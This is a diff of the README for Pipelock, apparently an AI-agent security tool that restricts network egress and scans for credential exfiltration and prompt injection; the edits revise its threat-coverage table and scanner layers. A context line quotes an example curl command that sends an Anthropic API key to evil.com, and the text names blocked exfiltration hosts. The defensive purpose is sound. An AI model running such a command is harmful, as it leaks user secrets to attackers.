@@ -10,7 +10,7 @@
 [![codecov](https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg)](https://codecov.io/gh/luckyPipewrench/pipelock)
 [![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
 
-**All-in-one security harness for AI agents.** One binary, zero dependencies. Controls network egress, detects credential exfiltration, scans for prompt injection, and monitors workspace integrity.
+**All-in-one security harness for AI agents.** Single static binary, no runtime dependencies. Controls network egress, detects credential exfiltration, scans for prompt injection, and monitors workspace integrity.
 
 If you run Claude Code, OpenHands, or any AI agent with shell access and API keys, this is for you.
 
@@ -30,7 +30,7 @@ curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over
 
 ## The Solution
 
-Pipelock uses **capability separation** — the agent process (which has secrets) is network-restricted, while a separate fetch proxy (which has NO secrets) handles web browsing. Every request goes through a 7-layer scanner pipeline.
+Pipelock uses **capability separation** — the agent process (which has secrets) is network-restricted, while a separate fetch proxy (which has NO secrets) handles web browsing. Every request goes through a 9-layer scanner pipeline.
 
 ```mermaid
 flowchart LR
@@ -122,16 +122,16 @@ docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
 
 | Threat | Coverage |
 |--------|----------|
-| ASI01 Prompt Injection | **Strong** — bidirectional MCP + response scanning |
-| ASI02 Insecure Tool Implementation | **Partial** — proxy as controlled tool, MCP scanning |
-| ASI03 Privilege Escalation | **Strong** — capability separation + SSRF protection |
-| ASI04 Insecure Output Handling | **Strong** — response scanning with block/strip/warn |
-| ASI05 Multi-Agent Orchestration | **Partial** — agent ID, integrity, signing |
-| ASI06 Excessive Agency | **Strong** — domain allowlist + rate limiting |
-| ASI07 Supply Chain Attacks | **Partial** — integrity monitoring + MCP scanning |
-| ASI08 Knowledge Base Poisoning | **Moderate** — injection detection on fetched content |
-| ASI09 Insufficient Logging | **Strong** — structured JSON + Prometheus |
-| ASI10 Uncontrolled Resource Consumption | **Strong** — rate limiting + size limits |
+| ASI01 Agent Goal Hijack | **Strong** - bidirectional MCP + response scanning |
+| ASI02 Tool Misuse | **Partial** - proxy as controlled tool, MCP scanning |
+| ASI03 Identity & Privilege Abuse | **Strong** - capability separation + SSRF protection |
+| ASI04 Supply Chain Vulnerabilities | **Partial** - integrity monitoring + MCP scanning |
+| ASI05 Unexpected Code Execution | **Moderate** - HITL approval, fail-closed defaults |
+| ASI06 Memory & Context Poisoning | **Moderate** - injection detection on fetched content |
+| ASI07 Insecure Inter-Agent Communication | **Partial** - agent ID, integrity, signing |
+| ASI08 Cascading Failures | **Moderate** - fail-closed architecture, rate limiting |
+| ASI09 Human-Agent Trust Exploitation | **Partial** - HITL modes, audit logging |
+| ASI10 Rogue Agents | **Strong** - domain allowlist + rate limiting + capability separation |
 
 Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)
 
@@ -172,15 +172,17 @@ Detects agent type (Claude Code, Cursor, CrewAI, LangGraph, AutoGen), programmin
 
 ### URL Scanning
 
-The fetch proxy runs a 7-layer scanner pipeline on every request:
+The fetch proxy runs a 9-layer scanner pipeline on every request:
 
-1. **SSRF protection** — blocks internal/private IPs with DNS rebinding prevention
-2. **Domain blocklist** — blocks known exfiltration targets (pastebin, transfer.sh)
-3. **Rate limiting** — per-domain sliding window
-4. **DLP patterns** — regex matching for API keys, tokens, and secrets
-5. **Environment variable leak detection** — detects the proxy's own env var values in URLs (raw + base64, values must be 16+ chars with entropy > 3.0)
-6. **Entropy analysis** — Shannon entropy flags encoded/encrypted data in URL segments
-7. **URL length limits** — unusually long URLs suggest data exfiltration
+1. **Scheme validation** — enforces http/https only
+2. **Domain blocklist** — blocks known exfiltration targets (pastebin, transfer.sh). Pre-DNS.
+3. **DLP patterns** — regex matching for API keys, tokens, and secrets (includes env variable leak detection: raw + base64, values 16+ chars with entropy > 3.0). Pre-DNS to prevent secret exfiltration via DNS queries.
+4. **Path entropy analysis** — Shannon entropy flags encoded/encrypted data in URL path segments
+5. **Subdomain entropy analysis** — flags high-entropy subdomains used for DNS exfiltration
+6. **SSRF protection** — blocks internal/private IPs with DNS rebinding prevention. Post-DNS, safe after DLP.
+7. **Rate limiting** — per-domain sliding window
+8. **URL length limits** — unusually long URLs suggest data exfiltration
+9. **Data budget** — per-domain byte limits prevent slow-drip exfiltration across many requests
 
 ### Response Scanning
 
